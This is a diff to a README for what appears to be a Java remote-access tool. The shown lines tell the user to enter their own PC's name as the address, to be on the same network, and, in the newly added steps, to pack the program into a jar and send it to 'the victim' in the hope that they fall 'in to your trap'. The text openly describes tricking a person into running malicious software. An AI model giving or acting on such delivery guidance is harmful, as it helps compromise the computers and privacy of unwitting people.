@@ -18,7 +18,9 @@ Written in Java, used API:
 1. Good question. Well the first thing that you need to do, is to change the Address in "ClientUtil" class.
 There, you need to put **your** PC's name in it.
 2. You need to be on the same Internet. Whether it's a public Internet or not, does not matter!
-3. Have fun :)
+3. You'll need to pack that in a jar file using pretty much any IDE (Intellij IDEA, Eclipse,...).
+4. Send the file to the victim and just hope that he/she falls in to your trap!
+5. Have fun :)
 
 ## Demonstration
 
